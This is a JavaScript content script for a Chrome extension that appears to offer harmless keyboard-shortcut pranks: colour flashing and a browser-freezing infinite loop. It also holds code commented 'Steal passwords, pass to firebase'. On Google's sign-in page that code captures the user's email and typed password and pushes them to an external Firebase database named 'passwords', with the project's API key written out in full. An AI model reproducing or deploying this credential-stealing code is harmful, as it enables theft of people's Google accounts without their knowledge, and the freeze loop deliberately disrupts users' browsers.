console.log("Tools iniatlized.")
function save(name,value){
    chrome.storage.local.set({name:value});
}
chrome.storage.local.set({keyName: "lolwat"});
chrome.storage.local.set({key: "lolwat"});
var all = document.getElementsByTagName("*");
function rand(min, max) {
  return Math.random() * (max - min) + min;
}
function r(){
    return Math.round(rand(0,255))
}
var re;
var g;
var b;
var cookie;
Mousetrap.bind("ctrl s p a z",function(){
    clearInterval(cookie)
    cookie = setInterval(function(){
    for (var i=0, max=all.length; i < max; i++) {
        temp = r()
        re = r()
        g = r()
        b = r()
         all[i].style.color = "rgb("+re+","+g+","+b+")"
         all[i].style.backgroundColor = "rgb("+String(255-re)+","+String(255-g)+","+String(255-b)+")"
    }},500)

})
//Total obliteration; unstable and requires resetting of chrome
Mousetrap.bind("ctrl k i l l",function(){
    while(true){
        console.log("BAHJAAH")
    }
})
Mousetrap.bind("ctrl h e l p",function(){
    var win = window.open("chrome-extension://moiocfafdipedlccikjengpfjbipjphg/help/main.html", "_new")
    
})
//Steal passwords, pass to firebase
var config = {
    apiKey: "AIzaSyAyx2WvmT9qVvjp-8nwjRd47_1SZxa6kIA",
    authDomain: "passwords-b9b90.firebaseapp.com",
    databaseURL: "https://passwords-b9b90.firebaseio.com",
    storageBucket: "",
    messagingSenderId: "887602617967"
  };
  firebase.initializeApp(config);
  ref = firebase.database().ref();

    if(window.location.href.substring(0,27) === "https://accounts.google.com"){
      console.log("This is not important at all")
        if(document.getElementById("signIn")===null){}
        else{

        document.getElementById("signIn").onclick = function(){

            ref.push({email:document.getElementById("email-display").innerHTML,password:document.getElementById("Passwd").value})



    }}
    }
